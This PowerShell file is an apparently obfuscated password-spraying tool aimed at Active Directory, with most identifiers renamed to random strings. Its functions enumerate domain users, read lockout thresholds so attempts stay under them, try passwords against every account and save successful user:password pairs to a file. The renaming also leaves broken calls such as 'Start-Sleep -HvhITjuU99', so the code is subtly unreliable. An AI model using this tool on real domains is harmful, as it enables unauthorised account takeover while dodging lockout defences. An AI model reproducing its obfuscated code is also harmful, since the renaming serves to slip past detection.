function Sheldon{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $WKaUyFOk99 = "",
     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $DrSPedYA99,
     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $jkMNnfnY99,
     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $ePOWnTBs99,
     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $KUALiQzg99 = "",
     [Parameter(Position = 5, Mandatory = $false)]
     [string]
     $yoViqXna99 = "",
     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $Force,
     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $qIgilcXi99,
     [Parameter(Position = 8, Mandatory = $false)]
     [int]
     $Delay=0,
     [Parameter(Position = 9, Mandatory = $false)]
     $iptKzOBH99=0,
     [Parameter(Position = 10, Mandatory = $false)]
     [switch]
     $Quiet,
     [Parameter(Position = 11, Mandatory = $false)]
     [int]
     $Fudge=10
    )
    if ($DrSPedYA99)
    {
        $BYKHGqng99 = @($DrSPedYA99)
    }
    elseif($qIgilcXi99)
    {
        $BYKHGqng99 = ""
    }
    elseif($jkMNnfnY99)
    {
        $BYKHGqng99 = Get-Content $jkMNnfnY99
    }
    else
    {
        Write-Host -ForegroundColor Red "The -DrSPedYA99 or -jkMNnfnY99 option must be specified"
        break
    }
    try
    {
        if ($yoViqXna99 -ne "")
        {
            $wNpeaGFq99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$yoViqXna99)
            $CVnkuzMa99 = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($wNpeaGFq99)
            $cYgzRKVn99 = "LDAP://" + ([ADSI]"LDAP://$yoViqXna99").distinguishedName
        }
        else
        {
            $CVnkuzMa99 = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $cYgzRKVn99 = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -yoViqXna99 option."
        break
    }
    if ($WKaUyFOk99 -eq "")
    {
        $AwNzqNUU99 = Mercurochrome -yoViqXna99 $yoViqXna99 -TbweiYBo99 -nyyJeeVM99 -KUALiQzg99 $KUALiQzg99
    }
    else
    {
        Write-Host "[*] Using $WKaUyFOk99 as userlist to spray with"
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
        $AwNzqNUU99 = @()
        try
        {
            $AwNzqNUU99 = Get-Content $WKaUyFOk99 -ErrorAction stop
        }
        catch [Exception]
        {
            Write-Host -ForegroundColor "red" "$_.Exception"
            break
        }
    }
    if ($BYKHGqng99.count -gt 1)
    {
        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
    }
    $fRknPvrq99 = Get-ObservationWindow $cYgzRKVn99
    Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $fRknPvrq99 minutes."
    Write-Host "[*] Setting a $fRknPvrq99 minute wait in between sprays."
    if (!$Force)
    {
        $title = "Confirm Password Spray"
        $lqzLtPAL99 = "Are you sure you want to perform a password spray against " + $AwNzqNUU99.count + " accounts?"
        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."
        $ALNveKYh99 = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
        $DgmsGTNl99 = $host.ui.PromptForChoice($title, $lqzLtPAL99, $ALNveKYh99, 0)
        if ($DgmsGTNl99 -ne 0)
        {
            Write-Host "Cancelling the password spray."
            break
        }
    }
    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun with " $BYKHGqng99.count " passwords"
    Write-Host "[*] This might take a while depending on the total number of users"
    if($qIgilcXi99)
    {
        renowned -yoViqXna99 $cYgzRKVn99 -AwNzqNUU99 $AwNzqNUU99 -ePOWnTBs99 $ePOWnTBs99 -Delay $Delay -iptKzOBH99 $iptKzOBH99 -qIgilcXi99 -Quiet $Quiet
    }
    else
    {
        for($i = 0; $i -lt $BYKHGqng99.count; $i++)
        {
            renowned -yoViqXna99 $cYgzRKVn99 -AwNzqNUU99 $AwNzqNUU99 -DrSPedYA99 $BYKHGqng99[$i] -ePOWnTBs99 $ePOWnTBs99 -Delay $Delay -iptKzOBH99 $iptKzOBH99 -Quiet $Quiet
            if (($i+1) -lt $BYKHGqng99.count)
            {
                monger -HvhITjuU99 (60*$fRknPvrq99 + $Fudge) -Quiet $Quiet
            }
        }
    }
    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
    if ($ePOWnTBs99 -ne "")
    {
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $ePOWnTBs99"
    }
}
function monger
{
    param(
        $HvhITjuU99 = 1800,
        $lqzLtPAL99 = "[*] Pausing to avoid account lockout.",
        [switch] $Quiet = $False
    )
    if ($quiet)
    {
        Start-Sleep -HvhITjuU99 $HvhITjuU99
    } else {
        foreach ($Count in (1..$HvhITjuU99))
        {
            Write-Progress -Id 1 -Activity $lqzLtPAL99 -Status "Waiting for $($HvhITjuU99/60) minutes. $($HvhITjuU99 - $Count) seconds remaining" -PercentComplete (($Count / $HvhITjuU99) * 100)
            Start-Sleep -HvhITjuU99 1
        }
        Write-Progress -Id 1 -Activity $lqzLtPAL99 -Status "Completed" -PercentComplete 100 -Completed
    }
}
function Mercurochrome
{
    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $yoViqXna99 = "",
     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $TbweiYBo99,
     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $nyyJeeVM99,
     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $KUALiQzg99
    )
    try
    {
        if ($yoViqXna99 -ne "")
        {
            $wNpeaGFq99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$yoViqXna99)
            $CVnkuzMa99 =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($wNpeaGFq99)
            $cYgzRKVn99 = "LDAP://" + ([ADSI]"LDAP://$yoViqXna99").distinguishedName
        }
        else
        {
            $CVnkuzMa99 =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $cYgzRKVn99 = "LDAP://" + ([ADSI]"").distinguishedName
        }
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -yoViqXna99 option."
        break
    }
    $rIOarJfP99 = [ADSI] "LDAP://$($CVnkuzMa99.PDCRoleOwner)"
    $gmGdEAld99 = @()
    $gmGdEAld99 += $rIOarJfP99.Properties.lockoutthreshold
    $CCFWYJnJ99 = [int] $rIOarJfP99.Properties['msds-behavior-version'].item(0)
    if ($CCFWYJnJ99 -ge 3)
    {
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $QutBpdjH99 = New-Object System.DirectoryServices.DirectorySearcher
        $QutBpdjH99.SearchRoot = $rIOarJfP99
        $QutBpdjH99.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $QutBpdjH99.FindAll()
        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                $HSdtOAHc99 = $entry | Select-Object -ExpandProperty Properties
                $RkqSEEFq99 = $HSdtOAHc99.name
                $OfBiSwKl99 = $HSdtOAHc99.'msds-lockoutthreshold'
                $lGpMKVyG99 = $HSdtOAHc99.'msds-psoappliesto'
                $THLsmSzt99 = $HSdtOAHc99.'msds-minimumpasswordlength'
                $gmGdEAld99 += $OfBiSwKl99
                Write-Host "[*] Fine-Grained Password Policy titled: $RkqSEEFq99 has a Lockout Threshold of $OfBiSwKl99 attempts, minimum password length of $THLsmSzt99 chars, and applies to $lGpMKVyG99.`r`n"
            }
        }
    }
    $fRknPvrq99 = Get-ObservationWindow $cYgzRKVn99
    [int]$clTILtYq99 = $gmGdEAld99 | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
    if ($clTILtYq99 -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $clTILtYq99 login attempts."
    }
    $IKdsesfh99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$cYgzRKVn99)
    $FOpsSaJR99 = New-Object System.DirectoryServices.DirectoryEntry
    $IKdsesfh99.SearchRoot = $FOpsSaJR99
    $IKdsesfh99.PropertiesToLoad.Add("samaccountname") > $Null
    $IKdsesfh99.PropertiesToLoad.Add("badpwdcount") > $Null
    $IKdsesfh99.PropertiesToLoad.Add("badpasswordtime") > $Null
    if ($TbweiYBo99)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
        $IKdsesfh99.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$KUALiQzg99)"
    }
    else
    {
        $IKdsesfh99.filter = "(&(objectCategory=person)(objectClass=user)$KUALiQzg99)"
    }
    $IKdsesfh99.PropertiesToLoad.add("samaccountname") > $Null
    $IKdsesfh99.PropertiesToLoad.add("lockouttime") > $Null
    $IKdsesfh99.PropertiesToLoad.add("badpwdcount") > $Null
    $IKdsesfh99.PropertiesToLoad.add("badpasswordtime") > $Null
    $IKdsesfh99.PageSize = 1000
    $KjAcSgcc99 = $IKdsesfh99.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $KjAcSgcc99.count + " total users found.")
    $AwNzqNUU99 = @()
    if ($nyyJeeVM99)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($user in $KjAcSgcc99)
        {
            $DFcVUERY99 = $user.Properties.badpwdcount
            $selgjtcI99 = $user.Properties.samaccountname
            try
            {
                $vuoMVJdd99 = $user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $xNwJpMgt99 = Get-Date
            $XLEkDrSu99 = [DateTime]::FromFileTime($vuoMVJdd99)
            $DtVlOkbj99 = ($xNwJpMgt99 - $XLEkDrSu99).TotalMinutes
            if ($DFcVUERY99)
            {
                [int]$PIpWFAEd99 = [convert]::ToInt32($DFcVUERY99, 10)
                $hTpzNsRl99 = $clTILtYq99 - $PIpWFAEd99
                if (($DtVlOkbj99 -gt $fRknPvrq99) -or ($hTpzNsRl99 -gt 1))
                                {
                    $AwNzqNUU99 += $selgjtcI99
                }
            }
        }
    }
    else
    {
        foreach ($user in $KjAcSgcc99)
        {
            $selgjtcI99 = $user.Properties.samaccountname
            $AwNzqNUU99 += $selgjtcI99
        }
    }
    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $AwNzqNUU99.count + " users gathered from the current user's domain")
    return $AwNzqNUU99
}
function renowned
{
    param(
            [Parameter(Position=1)]
            $yoViqXna99,
            [Parameter(Position=2)]
            [string[]]
            $AwNzqNUU99,
            [Parameter(Position=3)]
            [string]
            $DrSPedYA99,
            [Parameter(Position=4)]
            [string]
            $ePOWnTBs99,
            [Parameter(Position=5)]
            [int]
            $Delay=0,
            [Parameter(Position=6)]
            [double]
            $iptKzOBH99=0,
            [Parameter(Position=7)]
            [switch]
            $qIgilcXi99,
            [Parameter(Position=7)]
            [switch]
            $Quiet
    )
    $time = Get-Date
    $count = $AwNzqNUU99.count
    Write-Host "[*] Now trying password $DrSPedYA99 against $count users. Current time is $($time.ToShortTimeString())"
    $DGJebJzc99 = 0
    if ($ePOWnTBs99 -ne ""-and -not $Quiet)
    {
        Write-Host -ForegroundColor Yellow "[*] Writing successes to $ePOWnTBs99"    
    }
    $xIPkptBR99 = New-Object System.Random
    foreach ($User in $AwNzqNUU99)
    {
        if ($qIgilcXi99)
        {
            $DrSPedYA99 = $User
        }
        $sipbchbU99 = New-Object System.DirectoryServices.DirectoryEntry($yoViqXna99,$User,$DrSPedYA99)
        if ($sipbchbU99.name -ne $null)
        {
            if ($ePOWnTBs99 -ne "")
            {
                Add-Content $ePOWnTBs99 $User`:$DrSPedYA99
            }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$DrSPedYA99"
        }
        $DGJebJzc99 += 1
        if (-not $Quiet)
        {
            Write-Host -nonewline "$DGJebJzc99 of $count users tested`r"
        }
        if ($Delay)
        {
            Start-Sleep -HvhITjuU99 $xIPkptBR99.Next((1-$iptKzOBH99)*$Delay, (1+$iptKzOBH99)*$Delay)
        }
    }
}
function Get-ObservationWindow($lPuSWlGT99)
{
    $JHvtMtFs99 = $lPuSWlGT99.Properties['lockoutObservationWindow']
    $fRknPvrq99 = $lPuSWlGT99.ConvertLargeIntegerToInt64($JHvtMtFs99.Value) / -600000000
    return $fRknPvrq99
}
